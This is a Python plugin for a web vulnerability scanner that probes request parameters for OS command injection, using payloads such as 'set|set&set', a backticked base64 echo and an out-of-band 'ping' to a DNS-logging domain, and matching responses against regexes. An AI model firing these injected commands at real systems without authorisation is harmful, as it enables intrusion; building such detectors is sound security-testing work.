#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# w8ay 2019/7/4
# JiuZero 2025/6/14

import random
import re
from urllib.parse import quote
from lib.core.settings import acceptedExt
from lib.api.reverse_api import reverseApi
from api import generateResponse, random_str, conf, PLACE, VulType, POST_HINT, Type, PluginBase, Threads

class Z0SCAN(PluginBase):
    name = "cmdi"
    desc = 'Cmd Injection'
    version = "2025.6.14"
    risk = 3
        
    def audit(self):
        url = self.requests.url
        if conf.level == 0 or not 3 in conf.risk:
            return
        if not self.fingerprints.waf and self.requests.suffix in acceptedExt:
            randint = random.randint(1000, 9000)
            payloads = {
                "set|set&set": [
                    r'Path=[\s\S]*?PWD=',
                    r'Path=[\s\S]*?PATHEXT=',
                    r'Path=[\s\S]*?SHELL=',
                    r'Path\x3d[\s\S]*?PWD\x3d',
                    r'Path\x3d[\s\S]*?PATHEXT\x3d',
                    r'Path\x3d[\s\S]*?SHELL\x3d',
                    r'SERVER_SIGNATURE=[\s\S]*?SERVER_SOFTWARE=',
                    r'SERVER_SIGNATURE\x3d[\s\S]*?SERVER_SOFTWARE\x3d',
                    r'Non-authoritative\sanswer:\s+Name:\s*',
                    r'Server:\s*.*?\nAddress:\s*'
                ],
                "echo `echo {}|base64`{}".format(randint, randint): [
                    "NjE2Mjk4Mwo=6162983"
                ]
            }
            if "WINDOWS" in self.fingerprints.os:
                del payloads["echo `echo {}|base64`{}".format(randint, randint)]

            iterdatas = self.generateItemdatas()
            z0thread = Threads(name="cmdi")
            z0thread.submit(self.process, iterdatas, payloads)
                
    def process(self, _, payloads):
        dns = reverseApi()
        if dns.isUseReverse():
            dnsdomain = dns.generate_dns_token()
            dns_token = dnsdomain["token"]
            fullname = dnsdomain["fullname"]
            reverse_payload = "ping -nc 1 {}".format(fullname)
            payloads[reverse_payload] = []
        k, v, position = _
        if position in [PLACE.JSON_DATA, PLACE.MULTIPART_DATA, PLACE.XML_DATA]:
            return
        for _payload, rules in payloads.items():
            payload = self.insertPayload({
                "key": k, 
                "payload": _payload, 
                "position": position, 
                })
            r = self.req(position, payload)
            if not r:
                continue
            for rule in rules:
                html1 = r.text
                if re.search(rule, html1, re.I | re.S | re.M):
                    result = self.generate_result()
                    result.main({
                        "type": Type.REQUEST, 
                        "url": r.url, 
                        "vultype": VulType.CMD_INNJECTION, 
                        "show": {
                            "Position": f"{position} >> {k}", 
                            "Payload": payload
                            }
                        })
                    result.step("Request1", {
                        "position": position,
                        "request": r.reqinfo, 
                        "response": generateResponse(r), 
                        "desc": "Payload: {} Rule: {}".format(payload, rule)
                        })
                    self.success(result)
                    break
                if dns.isUseReverse():
                    dnslist = dns.check(dns_token)
                    if dnslist:
                        result = self.generate_result()
                        result.main({
                            "type": Type.REQUEST, 
                            "url": r.url, 
                            "vultype": VulType.CMD_INNJECTION, 
                            "show": {
                                "Position": f"{position} >> {k}", 
                                "Payload": payload,
                                "Msg": "Receive from Dnslog",
                                }
                            })
                        result.step("Request1", {
                            "position": position,
                            "request": r.reqinfo, 
                            "response": generateResponse(r), 
                            "desc": "Payload: {} Receive from Dnslog".format(payload),
                            })
                        self.success(result)
                        break
